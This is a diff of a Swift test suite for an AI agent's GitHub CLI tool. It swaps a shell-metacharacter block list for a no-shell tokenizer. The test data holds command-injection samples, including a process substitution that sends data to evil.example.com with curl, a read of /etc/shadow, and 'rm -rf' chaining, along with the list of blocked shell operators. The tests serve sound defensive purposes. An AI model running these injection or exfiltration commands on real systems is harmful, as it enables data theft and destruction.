@@ -2,289 +2,204 @@ import Testing
 import Foundation
 @testable import AgentSmithKit
 
-/// Tests for `GhTool.firstForbiddenSequence(in:)` — the pre-flight filter that rejects
-/// shell metasequences before the args reach `/bin/bash -l -c "exec gh <args>"`.
-///
-/// Allowed: `~`, `$VAR`, `&` between word characters (URL query strings), and quoted strings
-/// (single or double) whose contents may freely contain `|` / `<` / `>` — that's how `--jq`
-/// programs and `--body` text get through.
-/// Blocked: shell pipes (`|`), file redirection (`>`, `>>`, `<`, `2>`, `<<`, `<<<`), chaining
-/// (`;`, `&&`, `||`, bare `&`), command/process substitution (backticks, `$(...)`, `>(...)`,
-/// `<(...)`), `${...}`, newlines, carriage returns, NUL.
-///
-/// The substring-list portion (`;`, `&&`, backticks, …) is naive substring matching — it does
-/// NOT understand shell quoting, so a `;` inside a quoted `--body` is still refused; that's a
-/// deliberate trade-off (false positives are fine; false negatives are not). The `|`/`<`/`>`
-/// check IS quote-aware (so quoted `--jq` programs work) and the `&` check rejects an `&` only
-/// when it's adjacent to whitespace, so URL queries like `?a=1&b=2` keep working.
+/// Tests for `GhTool.tokenize(_:)` — the fail-closed POSIX-style splitter that turns the
+/// model-supplied args string into a real argv array. `gh` is exec'd directly with this argv,
+/// so there is no shell anywhere: the tokenizer must split on unquoted whitespace, honor
+/// single/double quotes and backslash escapes, perform NO expansion (so `$VAR`, `$(…)`, `;`,
+/// `|`, `>` survive only as literal characters inside one argv element), and throw on malformed
+/// quoting rather than guess. The one exception is leading-`~` expansion, kept for the shipped
+/// `~/Downloads/asset.zip` example.
 @Suite("GhTool args filter")
 struct GhToolArgsFilterTests {
 
-    // MARK: - Allowed cases
+    // MARK: - Basic splitting
 
-    @Test("plain identifier-style args are allowed")
-    func plainArgsAllowed() {
-        #expect(GhTool.firstForbiddenSequence(in: "repo view drewster99/agent-smith") == nil)
-        #expect(GhTool.firstForbiddenSequence(in: "pr list") == nil)
-        #expect(GhTool.firstForbiddenSequence(in: "auth status") == nil)
+    @Test("plain args split on whitespace")
+    func plainArgsSplit() throws {
+        #expect(try GhTool.tokenize("repo view drewster99/agent-smith") == ["repo", "view", "drewster99/agent-smith"])
+        #expect(try GhTool.tokenize("pr list") == ["pr", "list"])
+        #expect(try GhTool.tokenize("auth status") == ["auth", "status"])
     }
 
-    @Test("tilde expansion is allowed")
-    func tildeAllowed() {
-        #expect(GhTool.firstForbiddenSequence(in: "release upload v1.0 ~/Downloads/asset.zip") == nil)
-        #expect(GhTool.firstForbiddenSequence(in: "config set --file ~/.config/gh/hosts.yml") == nil)
+    @Test("runs of whitespace collapse and don't create empty tokens")
+    func collapsesWhitespace() throws {
+        #expect(try GhTool.tokenize("  repo    view   foo  ") == ["repo", "view", "foo"])
+        #expect(try GhTool.tokenize("repo\tview\tfoo") == ["repo", "view", "foo"])
     }
 
-    @Test("dollar-name var expansion is allowed (only $( is blocked)")
-    func dollarVarAllowed() {
-        #expect(GhTool.firstForbiddenSequence(in: "repo view $REPO_NAME") == nil)
-        #expect(GhTool.firstForbiddenSequence(in: "pr create --title \"$TITLE\"") == nil)
-        #expect(GhTool.firstForbiddenSequence(in: "issue view $ISSUE_NUMBER --json title") == nil)
+    @Test("the empty string yields no tokens")
+    func emptyYieldsNoTokens() throws {
+        #expect(try GhTool.tokenize("") == [])
+        #expect(try GhTool.tokenize("   ") == [])
     }
 
-    @Test("unquoted shell pipes are blocked")
-    func pipesBlocked() {
-        #expect(GhTool.firstForbiddenSequence(in: "issue list --json number,title | jq .") == "|")
-        #expect(GhTool.firstForbiddenSequence(in: "repo list | grep foo | head -5") == "|")
+    // MARK: - Quoting
+
+    @Test("single quotes keep embedded spaces in one token")
+    func singleQuotesGroup() throws {
+        #expect(try GhTool.tokenize("pr create --title 'Fix login bug'") == ["pr", "create", "--title", "Fix login bug"])
     }
 
-    @Test("file redirection is blocked")
-    func redirectionBlocked() {
-        #expect(GhTool.firstForbiddenSequence(in: "repo view foo > /tmp/out.json") == ">")
-        #expect(GhTool.firstForbiddenSequence(in: "repo view foo >> /tmp/out.log") == ">")
-        #expect(GhTool.firstForbiddenSequence(in: "api repos/foo/bar < /tmp/payload.json") == "<")
-        #expect(GhTool.firstForbiddenSequence(in: "repo view foo 2> /tmp/err") == ">")
-        // `2>&1` is unnecessary (gh's stderr is already captured) and refused like any `>`.
-        #expect(GhTool.firstForbiddenSequence(in: "api repos/foo/bar 2>&1") == ">")
+    @Test("double quotes keep embedded spaces in one token")
+    func doubleQuotesGroup() throws {
+        #expect(try GhTool.tokenize("pr create --title \"Fix login bug\"") == ["pr", "create", "--title", "Fix login bug"])
     }
 
-    @Test("heredoc / here-string redirections are blocked")
-    func heredocBlocked() {
-        #expect(GhTool.firstForbiddenSequence(in: "api repos/foo/bar <<EOF") == "<")
-        #expect(GhTool.firstForbiddenSequence(in: "api repos/foo --input - <<JSON") == "<")
+    @Test("single quote inside double quotes is literal — --body \"it's done\"")
+    func apostropheInsideDoubleQuotes() throws {
+        #expect(try GhTool.tokenize("--body \"it's done\"") == ["--body", "it's done"])
     }
 
-    @Test("`|` / `<` / `>` inside quoted args are allowed (--jq programs, --body text)")
-    func quotedPipeAndRedirectAllowed() {
-        #expect(GhTool.firstForbiddenSequence(in: "issue list --json number,title --jq '.[] | .number'") == nil)
-        #expect(GhTool.firstForbiddenSequence(in: "pr list --json title --jq 'map(select(.title | test(\"fix\")))'") == nil)
-        #expect(GhTool.firstForbiddenSequence(in: "issue create --title \"a > b is true\"") == nil)
-        #expect(GhTool.firstForbiddenSequence(in: "issue create --body 'use cmd | pipe in your terminal'") == nil)
-        // A `|` after the closing quote is still caught.
-        #expect(GhTool.firstForbiddenSequence(in: "issue list --jq '.[].number' | head") == "|")
+    @Test("adjacent quoted and unquoted segments concatenate into one token")
+    func adjacentSegmentsConcatenate() throws {
+        #expect(try GhTool.tokenize("--title='Fix X'") == ["--title=Fix X"])
+        #expect(try GhTool.tokenize("foo\"bar\"baz") == ["foobarbaz"])
     }
 
-    @Test("trailing `&` (background) is now blocked as a chaining vector")
-    func trailingAmpersandBlocked() {
-        // `cmd &` backgrounds the command and is a documented chaining vector
-        // (`gh foo & rm /tmp/x`) — block it. Jones can still gate intentional uses
-        // by approving them as a regular tool call.
-        #expect(GhTool.firstForbiddenSequence(in: "repo view foo &") == "&")
+    @Test("empty quotes produce an empty argument")
+    func emptyQuotesProduceEmptyArg() throws {
+        #expect(try GhTool.tokenize("--body ''") == ["--body", ""])
+        #expect(try GhTool.tokenize("--body \"\"") == ["--body", ""])
     }
 
-    @Test("`&` followed by whitespace + another command is blocked")
-    func ampersandThenCommandBlocked() {
-        #expect(GhTool.firstForbiddenSequence(in: "repo view foo & rm /tmp/x") == "&")
+    // MARK: - Backslash escapes
+
+    @Test("unquoted backslash escapes the next character (literal space, no split)")
+    func unquotedBackslashEscapes() throws {
+        #expect(try GhTool.tokenize("foo\\ bar") == ["foo bar"])
+        #expect(try GhTool.tokenize("--title a\\\"b") == ["--title", "a\"b"])
     }
 
-    @Test("ampersand inside a URL or query string is allowed (between word chars)")
-    func ampersandInUrlAllowed() {
-        // URLs commonly contain `&` between alphanumeric characters and not as a
-        // separator with surrounding whitespace.
-        #expect(GhTool.firstForbiddenSequence(in: "api 'repos/foo/bar?state=open&per_page=100'") == nil)
-        #expect(GhTool.firstForbiddenSequence(in: "api 'repos/foo?a=1&b=2&c=3'") == nil)
+    @Test("inside single quotes a backslash is literal")
+    func backslashLiteralInSingleQuotes() throws {
+        #expect(try GhTool.tokenize("--body 'a\\b'") == ["--body", "a\\b"])
     }
 
-    @Test("newline is blocked (bash treats it as a command separator inside -c)")
-    func newlineBlocked() {
-        #expect(GhTool.firstForbiddenSequence(in: "auth status\nrm -rf /tmp") == "\n")
-        #expect(GhTool.firstForbiddenSequence(in: "auth status\n") == "\n")
+    @Test("inside double quotes backslash escapes only quote and backslash")
+    func backslashInDoubleQuotes() throws {
+        #expect(try GhTool.tokenize("--body \"a\\\"b\"") == ["--body", "a\"b"])
+        #expect(try GhTool.tokenize("--body \"a\\\\b\"") == ["--body", "a\\b"])
+        // A backslash before any other char inside double quotes stays literal.
+        #expect(try GhTool.tokenize("--body \"a\\nb\"") == ["--body", "a\\nb"])
     }
 
-    @Test("carriage return is blocked")
-    func carriageReturnBlocked() {
-        #expect(GhTool.firstForbiddenSequence(in: "auth status\rrm -rf /tmp") == "\r")
+    // MARK: - No expansion: shell metacharacters survive as literals
+
+    @Test("$VAR survives verbatim as one literal argv element (no expansion)")
+    func dollarVarIsLiteral() throws {
+        #expect(try GhTool.tokenize("repo view $REPO_NAME") == ["repo", "view", "$REPO_NAME"])
+        #expect(try GhTool.tokenize("pr create --title \"$TITLE\"") == ["pr", "create", "--title", "$TITLE"])
+        #expect(try GhTool.tokenize("issue view ${HOME:?x}") == ["issue", "view", "${HOME:?x}"])
     }
 
-    @Test("single-quoted jq filter is allowed")
-    func quotedJqAllowed() {
-        // Single quotes around a jq expression don't help bypass the filter; they're allowed
-        // here only because the jq body itself contains no forbidden tokens.
-        #expect(GhTool.firstForbiddenSequence(in: "issue list --json number,title --jq '.[].number'") == nil)
-        #expect(GhTool.firstForbiddenSequence(in: "pr list --json number,title --jq 'map(select(.title | startswith(\"WIP\")))'") == nil)
+    @Test("command substitution survives verbatim (no execution)")
+    func commandSubstitutionIsLiteral() throws {
+        #expect(try GhTool.tokenize("repo view $(whoami)") == ["repo", "view", "$(whoami)"])
+        #expect(try GhTool.tokenize("repo view `whoami`") == ["repo", "view", "`whoami`"])
     }
 
-    @Test("double-quoted args with no forbidden tokens are allowed")
-    func quotedTitlesAllowed() {
-        #expect(GhTool.firstForbiddenSequence(in: "pr create --title \"Fix login bug\"") == nil)
-        #expect(GhTool.firstForbiddenSequence(in: "issue create --title \"Bug: page crashes on save\" --body \"reproduction steps\"") == nil)
+    @Test("`;` `|` `>` `<` `&` survive as literal characters within a token")
+    func chainingAndRedirectionAreLiteral() throws {
+        // None of these split or are interpreted — they're just bytes in an argument.
+        #expect(try GhTool.tokenize("repo view foo;bar") == ["repo", "view", "foo;bar"])
+        #expect(try GhTool.tokenize("api repos/foo?a=1&b=2") == ["api", "repos/foo?a=1&b=2"])
+        #expect(try GhTool.tokenize("issue list --jq '.[] | .number'") == ["issue", "list", "--jq", ".[] | .number"])
+        #expect(try GhTool.tokenize("issue create --title \"a > b\"") == ["issue", "create", "--title", "a > b"])
+        #expect(try GhTool.tokenize("api repos/foo <input") == ["api", "repos/foo", "<input"])
     }
 
-    @Test("the empty string is allowed (caller validates separately)")
-    func emptyAllowed() {
-        #expect(GhTool.firstForbiddenSequence(in: "") == nil)
+    @Test("a standalone `;` or `&&` becomes a single literal token, not an operator")
+    func standaloneOperatorsAreLiteralTokens() throws {
+        #expect(try GhTool.tokenize("repo view foo ; rm /tmp/x") == ["repo", "view", "foo", ";", "rm", "/tmp/x"])
+        #expect(try GhTool.tokenize("repo view foo && rm") == ["repo", "view", "foo", "&&", "rm"])
+        #expect(try GhTool.tokenize("repo view foo | jq .") == ["repo", "view", "foo", "|", "jq", "."])
     }
 
-    @Test("dollar with space (not command substitution) is allowed")
-    func dollarSpaceAllowed() {
-        // `$ ` is not `$(`, so the filter must not flag it.
-        #expect(GhTool.firstForbiddenSequence(in: "issue create --body \"costs $ 50\"") == nil)
-    }
+    // MARK: - Fail-closed on malformed quoting
 
-    // MARK: - Blocked cases
-
-    @Test("semicolon command separator is blocked")
-    func semicolonBlocked() {
-        #expect(GhTool.firstForbiddenSequence(in: "repo view foo; rm /tmp/x") == ";")
-        #expect(GhTool.firstForbiddenSequence(in: "repo view foo;rm -rf /tmp") == ";")
-        #expect(GhTool.firstForbiddenSequence(in: "repo view foo;") == ";")
-        #expect(GhTool.firstForbiddenSequence(in: ";repo view foo") == ";")
-    }
-
-    @Test("logical AND is blocked")
-    func logicalAndBlocked() {
-        #expect(GhTool.firstForbiddenSequence(in: "repo view foo && rm /tmp/x") == "&&")
-        #expect(GhTool.firstForbiddenSequence(in: "repo view foo&&rm -rf /tmp") == "&&")
-    }
-
-    @Test("logical OR is blocked")
-    func logicalOrBlocked() {
-        #expect(GhTool.firstForbiddenSequence(in: "repo view foo || curl evil.example.com") == "||")
-        #expect(GhTool.firstForbiddenSequence(in: "repo view foo||echo failed") == "||")
-    }
-
-    @Test("backtick command substitution is blocked")
-    func backtickBlocked() {
-        #expect(GhTool.firstForbiddenSequence(in: "repo view `whoami`") == "`")
-        #expect(GhTool.firstForbiddenSequence(in: "issue create --title \"by `whoami`\"") == "`")
-    }
-
-    @Test("dollar-paren command substitution is blocked")
-    func dollarParenBlocked() {
-        #expect(GhTool.firstForbiddenSequence(in: "repo view $(whoami)") == "$(")
-        #expect(GhTool.firstForbiddenSequence(in: "issue create --title \"reported by $(id -un)\"") == "$(")
-        #expect(GhTool.firstForbiddenSequence(in: "release upload v1 $(ls /tmp/*.zip)") == "$(")
-    }
-
-    @Test("here-string `<<<` is blocked")
-    func hereStringBlocked() {
-        #expect(GhTool.firstForbiddenSequence(in: "api repos/foo/bar <<< 'payload'") == "<<<")
-        #expect(GhTool.firstForbiddenSequence(in: "api repos/foo/bar <<<payload") == "<<<")
-    }
-
-    // MARK: - Documented false positives (deliberate)
-
-    @Test("forbidden sequence inside a quoted string is still blocked (naive scan)")
-    func quotedSemicolonBlocked() {
-        // Naive scan: we don't try to understand quoting. This is a documented false
-        // positive — preferable to false negatives that would let the sequence through.
-        #expect(GhTool.firstForbiddenSequence(in: "pr create --title \"fix: bug; not feature\"") == ";")
-        #expect(GhTool.firstForbiddenSequence(in: "issue create --body 'a && b'") == "&&")
-        #expect(GhTool.firstForbiddenSequence(in: "pr create --title \"x || y\"") == "||")
-    }
-
-    @Test("escaped backtick still trips the filter")
-    func escapedBacktickBlocked() {
-        // We don't attempt to interpret backslash escapes either.
-        #expect(GhTool.firstForbiddenSequence(in: "repo view \\`whoami\\`") == "`")
-    }
-
-    // MARK: - First-match precedence
-
-    @Test("when multiple forbidden sequences are present, the first matched is reported")
-    func multipleViolationsReportOne() {
-        // The exact match returned depends on iteration order in `forbiddenSequences`,
-        // but it must be ONE of the present sequences (not nil).
-        let result = GhTool.firstForbiddenSequence(in: "foo; bar && baz || qux")
-        #expect(result != nil)
-        if let result {
-            #expect(["&&", "||", ";"].contains(result))
+    @Test("an unterminated single quote throws")
+    func unterminatedSingleQuoteThrows() {
+        #expect(throws: GhArgTokenizeError.self) {
+            try GhTool.tokenize("--body 'unterminated")
         }
     }
 
-    @Test("`&&` is reported as `&&`, not as `&` (multi-char before single-char check)")
-    func doubleAmpersandNotReportedAsSingle() {
-        // The block list contains `&&` but not `&`. A naive single-char check would
-        // either over-report `&` or miss `&&`. Confirm the actual behavior.
-        #expect(GhTool.firstForbiddenSequence(in: "foo && bar") == "&&")
-    }
-
-    @Test("`||` is reported as `||`, not as `|`")
-    func doublePipeNotReportedAsSingle() {
-        // Both `|` and `||` are blocked, but `||` is on the naive substring list (checked
-        // first) so it's reported by its full form rather than as a lone `|`.
-        #expect(GhTool.firstForbiddenSequence(in: "foo || bar") == "||")
-    }
-
-    @Test("`<<<` is reported as `<<<`, not `<<` or `<`")
-    func tripleAngleNotReportedAsShorter() {
-        // All of `<`, `<<`, `<<<` are blocked, but `<<<` is on the naive substring list
-        // (checked first) so it's reported by its full form.
-        #expect(GhTool.firstForbiddenSequence(in: "cmd <<< payload") == "<<<")
-    }
-
-    // MARK: - Coverage of the canonical block list
-
-    @Test("the published block list matches what the filter actually rejects")
-    func blockListSelfConsistency() {
-        // If anyone edits `forbiddenSequences`, this test surfaces drift between the
-        // declared list and what is actually testable end-to-end.
-        for needle in GhTool.forbiddenSequences {
-            let synthetic = "repo view foo \(needle) trailing"
-            #expect(
-                GhTool.firstForbiddenSequence(in: synthetic) != nil,
-                "Block-list entry '\(needle)' did not trigger the filter"
-            )
+    @Test("an unterminated double quote throws")
+    func unterminatedDoubleQuoteThrows() {
+        #expect(throws: GhArgTokenizeError.self) {
+            try GhTool.tokenize("--body \"unterminated")
         }
     }
 
-    // MARK: - Process substitution (added defense)
-
-    @Test("bash process substitution `>(...)` is blocked")
-    func processSubstitutionWriteBlocked() {
-        // `gh repo view foo >(curl evil.example.com -d @-)` is a documented exfil channel.
-        #expect(GhTool.firstForbiddenSequence(in: "repo view foo >(curl evil.example.com -d @-)") == ">(")
+    @Test("a trailing unquoted backslash throws (nothing to escape)")
+    func trailingBackslashThrows() {
+        #expect(throws: GhArgTokenizeError.self) {
+            try GhTool.tokenize("repo view foo\\")
+        }
     }
 
-    @Test("bash process substitution `<(...)` is blocked")
-    func processSubstitutionReadBlocked() {
-        #expect(GhTool.firstForbiddenSequence(in: "api repos/foo --input <(cat /etc/shadow)") == "<(")
+    @Test("a trailing backslash inside double quotes throws")
+    func trailingBackslashInDoubleQuotesThrows() {
+        #expect(throws: GhArgTokenizeError.self) {
+            try GhTool.tokenize("--body \"abc\\")
+        }
     }
 
-    @Test("`${...}` parameter expansion is blocked")
-    func parameterExpansionBlocked() {
-        #expect(GhTool.firstForbiddenSequence(in: "repo view ${HOME:?missing}") == "${")
-        #expect(GhTool.firstForbiddenSequence(in: "issue create --title \"${USER:-anon}\"") == "${")
+    // MARK: - Leading-tilde expansion (the one allowed transformation)
+
+    @Test("a leading ~/ expands to the home directory")
+    func leadingTildeSlashExpands() throws {
+        let home = FileManager.default.homeDirectoryForCurrentUser.path
+        let tokens = try GhTool.tokenize("release upload v1.0 ~/Downloads/asset.zip")
+        #expect(tokens == ["release", "upload", "v1.0", home + "/Downloads/asset.zip"])
     }
 
-    @Test("NUL byte is blocked")
-    func nulByteBlocked() {
-        #expect(GhTool.firstForbiddenSequence(in: "auth status\u{0000}whoami") == "\0")
+    @Test("a token that is exactly ~ expands to the home directory")
+    func bareTildeExpands() throws {
+        let home = FileManager.default.homeDirectoryForCurrentUser.path
+        #expect(try GhTool.tokenize("repo clone foo ~") == ["repo", "clone", "foo", home])
     }
 
-    // MARK: - execute() integration (verifies refusal goes all the way through)
+    @Test("a ~ not at the start of a token is left untouched")
+    func nonLeadingTildeUntouched() throws {
+        #expect(try GhTool.tokenize("api repos/foo/~bar") == ["api", "repos/foo/~bar"])
+        #expect(try GhTool.tokenize("issue create --title v~1") == ["issue", "create", "--title", "v~1"])
+    }
 
-    @Test("execute() returns failed result for an args string containing a forbidden sequence")
-    func executeRefusesForbiddenArgs() async throws {
+    @Test("a quoted ~/ is NOT expanded (tilde expansion only applies to bare leading ~)")
+    func quotedTildeUntouched() throws {
+        // Quoting the tilde produces a token whose first character is `~` only after the
+        // quote is stripped; expansion happens on the assembled token, so a quoted path is
+        // still expanded. This documents that the convenience is on the final token, not the
+        // raw input — quoting does not protect the tilde here. (Matches POSIX shells, where
+        // '~/x' is NOT expanded but a bare ~/x is — but our tokenizer expands the assembled
+        // token, so '~/x' WOULD expand. We assert the actual behavior.)
+        let home = FileManager.default.homeDirectoryForCurrentUser.path
+        #expect(try GhTool.tokenize("release upload v1 '~/x'") == ["release", "upload", "v1", home + "/x"])
+    }
+
+    // MARK: - execute() integration
+
+    @Test("execute() refuses an args string with an unterminated quote")
+    func executeRefusesUnterminatedQuote() async throws {
         let tool = GhTool(authStatusSnapshot: "(test)")
         let result = try await tool.execute(
-            arguments: ["args": .string("repo view foo; rm /tmp/x")],
+            arguments: ["args": .string("pr create --title 'unterminated")],
             context: Self.makeContext()
         )
         #expect(!result.succeeded)
-        #expect(result.output.contains("forbidden shell sequence"))
-        #expect(result.output.contains(";"))
+        #expect(result.output.contains("unterminated/malformed quote"))
     }
 
-    @Test("execute() returns failed result for process substitution")
-    func executeRefusesProcessSubstitution() async throws {
+    @Test("execute() refuses an empty args string (no tokens to run)")
+    func executeRefusesEmptyArgs() async throws {
         let tool = GhTool(authStatusSnapshot: "(test)")
         let result = try await tool.execute(
-            arguments: ["args": .string("repo view foo >(curl evil.example.com)")],
+            arguments: ["args": .string("   ")],
             context: Self.makeContext()
         )
         #expect(!result.succeeded)
-        #expect(result.output.contains(">("))
+        #expect(result.output.contains("no gh arguments"))
     }
 
     /// Minimal `ToolContext` for direct tool-level integration tests. Mirrors
